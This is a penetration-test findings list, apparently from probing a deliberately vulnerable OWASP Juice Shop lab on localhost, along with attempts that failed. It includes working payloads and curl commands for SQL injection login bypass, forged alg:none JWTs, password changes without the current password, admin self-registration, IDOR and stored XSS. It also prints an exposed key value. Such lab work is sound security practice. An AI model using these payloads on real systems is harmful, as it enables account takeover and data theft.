summary: Compilation of all probe findings across vulnerability classes
body:
== VULNERABILITY FINDINGS ==

1. SQL Injection in Login (Critical)
   - Payload: `' OR 1=1--` as email logs in as admin
   - Response: Returns admin JWT token
   - Proof: curl -X POST http://127.0.0.1:3010/rest/user/login -H "Content-Type: application/json" -d '{"email":"'"'"' OR 1=1--","password":"test"}'

2. JWT Unsigned/None Algorithm (Critical)
   - JWT with `alg:none` accepted without signature verification
   - Forged tokens can impersonate any user/role
   - Proof: Created JWT with header {"alg":"none","typ":"JWT"} and arbitrary payload - accepted by /api/Users and /api/Cards

3. Password Change Without Current Password (Critical)
   - GET /rest/user/change-password?new=xxx&repeat=xxx (without `current` param)
   - Changes password without verifying current password
   - Proof: curl "http://127.0.0.1:3010/rest/user/change-password?new=admin123&repeat=admin123" -H "Authorization: Bearer $TOKEN"

4. Mass Assignment / Admin Registration (High)
   - POST /api/Users accepts `role: admin` parameter
   - Creates admin user without restriction
   - Proof: curl -X POST http://127.0.0.1:3010/api/Users -H "Content-Type: application/json" -d '{"email":"hacker@test.com","password":"test123","passwordRepeat":"test123","role":"admin"}'

5. Excessive Data Exposure – Password Hashes (High)
   - /rest/memories returns user memories with embedded user data including MD5 password hashes
   - No authentication required
   - Proof: curl http://127.0.0.1:3010/rest/memories (returns hashes for 10 users)

6. IDOR – Insecure Direct Object Reference on Baskets (High)
   - Any authenticated user can access any basket by ID
   - Normal user can view admin's basket
   - Proof: curl http://127.0.0.1:3010/rest/basket/1 -H "Authorization: Bearer $TOKEN" (works for any auth token)

7. Stored XSS via Product Reviews (Medium)
   - PUT /rest/products/1/reviews stores HTML/JS in message field
   - XSS payload <script>alert(1)</script> persisted
   - Proof: curl -X PUT http://127.0.0.1:3010/rest/products/1/reviews -H "Content-Type: application/json" -d '{"message":"<script>alert(1)</script>","author":"test@test.com"}'

8. Directory Listing Enabled (Medium)
   - /ftp/ – sensitive files exposed
   - /encryptionkeys/ – JWT public key and premium key
   - /support/logs/ – access logs exposed

9. Sensitive File Exposure (Medium)
   - JWT public key at /encryptionkeys/jwt.pub
   - Premium key at /encryptionkeys/premium.key (1337133713371337.EA99A61D92D2955B1E9285B55BF2AD42)
   - Access logs at /support/logs/access.log.2026-07-23

10. Information Disclosure – Security Questions (Low)
    - /rest/user/security-question?email=admin@juice-sh.op reveals security question

11. JWT Contains Password Hash in Plaintext (Medium)
    - JWT payload includes the password hash (MD5) in the token body

== DEAD ENDS ==
- SSRF: Not exploitable (no internal request endpoints identified)
- SSTI: Not found ({{7*7}} not evaluated in any endpoint)
- Open Redirect: /redirect validates target URL, returns 406 for unrecognized targets
- CSRF: Rate limiting / IP blocking on unauthorized password change attempts
- File Upload: Type/extension checking prevents malicious uploads
- .git exposure: Returns SPA (Angular catch-all)
- Command Injection: Not identified
- NoSQL Injection: Login rejects object type; reviews endpoint returns same data with/without injection operators
- Captcha Bypass: SQL injection on captchaId returns "Wrong answer" – not directly exploitable
